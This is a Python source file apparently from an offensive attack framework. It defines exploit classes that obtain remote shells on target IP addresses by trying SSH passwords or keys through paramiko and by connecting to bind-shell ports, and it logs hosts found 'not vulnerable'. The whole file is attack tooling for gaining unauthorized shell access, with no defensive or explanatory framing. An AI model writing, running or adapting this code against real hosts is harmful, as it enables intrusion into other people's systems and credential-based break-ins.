import TargetCollection
import paramiko
from shell_cl import *
import socket

class exploit_class:

	def __init__(self,ip):
		self.ip = ip

	def get_shell(self):
		pass

class ssh_pass(exploit_class):

	def __init__(self,ip,args):
		exploit_class.__init__(self,ip)
		self.username = args['username']
		self.password = args['password']

	def get_shell(self):
		try:
			sshcon = paramiko.SSHClient()
			sshcon.connect(hostname=self.ip, username=self.username, password=self.password, timeout=3)
			the_shell = ssh_shell(sshcon)
			return the_shell
		except Exception as e:
			TargetCollection.logme(self.ip + " not vulnerable with password " + self.password + "\n")
			return e


class ssh_key(exploit_class):

	def __init__(self,ip,args):
		exploit_class.__init__(self,ip)
		self.username = args['username']
		self.key = args['key']

	def get_shell(self):
		try:
			sshcon = paramiko.SSHClient()
			sshcon.connect(hostname=self.ip, username=self.username, key_filename=self.key, timeout=3)
			the_shell = ssh_shell(sshcon)
			return the_shell

		except Exception as e:
			TargetCollection.logme(self.ip + " not vulnerable key " + self.key + "\n")
			return e

class bind_shell(exploit_class):

	def __init__(self,ip,args):
		exploit_class.__init__(self,ip)
		self.port = args['port']

	def get_shell(self):
		try:
			sock = socket.socket()
			sock.connect((self.ip, self.port))
			return socket_shell(sock)
		except Exception as e:
			TargetCollection.logme(self.ip + " not open on port " + self.port + "\n")
			return e